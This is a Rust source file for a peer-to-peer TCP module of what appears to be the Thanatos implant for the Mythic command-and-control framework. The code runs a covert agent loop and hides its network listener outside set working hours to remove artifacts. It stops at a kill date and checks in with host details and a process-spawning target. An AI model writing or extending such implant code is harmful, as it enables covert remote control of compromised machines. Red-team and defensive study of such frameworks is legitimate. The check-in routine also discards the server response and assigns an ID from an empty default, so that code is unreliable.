use std::{cmp, time::Duration};

use crate::Tasker;

use super::{CoreAgent, P2PAgent};

use agent_utils::{
    errors::{ProfileInternalError, ThanatosError},
    msg::{ExtraInfo, InitialCheckinInfo, InitialCheckinResponse, MythicAction, SpawnToValue},
};

#[cfg(feature = "tcp")]
use profile_tcp::TcpProfile as ConfiguredProfile;

use base_profile::{IOHandle, P2PProfile, ReadWritePoll, RecvStatus};

pub struct Agent {
    uuid: String,
    killdate: std::time::Duration,
    tasker: Tasker,
    checked_in: bool,

    shared: AgentShared,

    profile: Option<ConfiguredProfile>,
}

pub struct AgentShared {
    pub exit_agent: bool,

    /// Start of the working hours (duration since midnight)
    pub working_start: Duration,

    /// End of the working hours (duration since midnight)
    pub working_end: Duration,
}

impl CoreAgent for Agent {
    fn run(&mut self) -> Result<(), ThanatosError> {
        self.hibernate();

        while !self.shared.exit_agent {
            let profile: &mut ConfiguredProfile = if let Some(ref mut profile) = self.profile {
                profile
            } else {
                self.profile
                    .insert(agent_utils::debug_invoke!(ConfiguredProfile::new()))
            };

            agent_utils::log!("Profile: {:?}", &profile);

            match profile.poll_connection(Duration::from_secs(1)) {
                Ok(handle) => {
                    agent_utils::log!("New connection");
                    let _ = self.new_connection(handle);
                }
                Err(ThanatosError::ProfileError(ProfileInternalError::NoConnection)) => {
                    agent_utils::log!("No connection.");
                }
                Err(e) => {
                    agent_utils::log!("{:?}", e);
                    self.shared.exit_agent = true;
                }
            }

            self.hibernate();
        }

        Ok(())
    }

    fn initialize_from_tasker(tasker: Tasker) -> Result<Self, ThanatosError> {
        #[cfg(feature = "tcp")]
        use config::tcp as profile_config;

        Ok(Self {
            shared: AgentShared {
                exit_agent: false,
                working_start: Duration::from_secs(config::get_working_start()),
                working_end: Duration::from_secs(config::get_working_end()),
            },
            uuid: config::get_uuid().to_string(),
            killdate: Duration::from_secs(profile_config::get_killdate()),

            checked_in: false,
            profile: None,

            tasker,
        })
    }
}

impl P2PAgent for Agent {
    fn hibernate(&mut self) {
        // Check the working hours
        let current_time = agent_utils::get_timeofday();
        if current_time < self.shared.working_start {
            agent_utils::log!(
                "Not at working hours start. Dropping profile and sleeping for {} seconds",
                (self.shared.working_start - current_time).as_secs()
            );

            // Drop the profile to get rid of any p2p artifacts
            self.profile = None;

            std::thread::sleep(self.shared.working_start - current_time);
        }

        let current_time = agent_utils::get_timeofday();
        if current_time > self.shared.working_end {
            const MIDNIGHT: Duration = Duration::from_secs(86400);

            agent_utils::log!(
                "Past the end of working hours. Dropping profile and sleeping for {} seconds",
                ((MIDNIGHT - current_time) + self.shared.working_start).as_secs()
            );

            // Drop the profile to get rid of any p2p artifacts
            self.profile = None;

            std::thread::sleep((MIDNIGHT - current_time) + self.shared.working_start);
        }

        // Check the killdate
        let current_time = agent_utils::get_timestamp();
        if current_time >= self.killdate {
            self.shared.exit_agent = true;
        }
    }
}

impl Agent {
    fn new_connection<T>(&mut self, mut conn: IOHandle<T>) -> Result<(), ThanatosError>
    where
        T: ReadWritePoll,
    {
        if !self.checked_in {
            self.make_checkin(&mut conn)?;
        }
        Ok(())
    }

    fn make_checkin<T>(&mut self, conn: &mut IOHandle<T>) -> Result<(), ThanatosError>
    where
        T: ReadWritePoll,
    {
        let working_start_hours = self.shared.working_start.as_secs() / 3600;
        let working_start_minutes = (self.shared.working_start.as_secs() / 60) % 60;

        let working_end_hours = (self.shared.working_end.as_secs() - 60) / 3600;
        let working_end_minutes = ((self.shared.working_end.as_secs() - 60) / 60) % 60;

        let spawnto = config::get_spawnto().and_then(|s| {
            let mut s_val = s.split(" ");
            let path = s_val.next()?.to_string();
            let args: Vec<String> = s_val.map(|s| s.to_string()).collect();

            Some(SpawnToValue { path, args })
        });

        let extra_info = serde_json::to_string_pretty(&ExtraInfo {
            working_hours: format!(
                "{:0<2}:{:0<2}-{:0<2}:{:0<2}",
                working_start_hours, working_start_minutes, working_end_hours, working_end_minutes
            )
            .as_str(),
            c2_profiles: Vec::new(),
            exec_internal: true,
            spawnto,
        })
        .map_err(|_| ThanatosError::JsonEncodeError)?;

        let initial_checkin_info = InitialCheckinInfo {
            action: MythicAction::Checkin,
            uuid: config::get_uuid(),
            attributes: agent_utils::get_checkin_info(),
            extra_info: &extra_info,
            sleep_info: None,
        };

        conn.send_data(&config::get_uuid(), &initial_checkin_info)?;

        let mut resp = InitialCheckinResponse::default();

        self.uuid = resp.id;

        Ok(())
    }
}
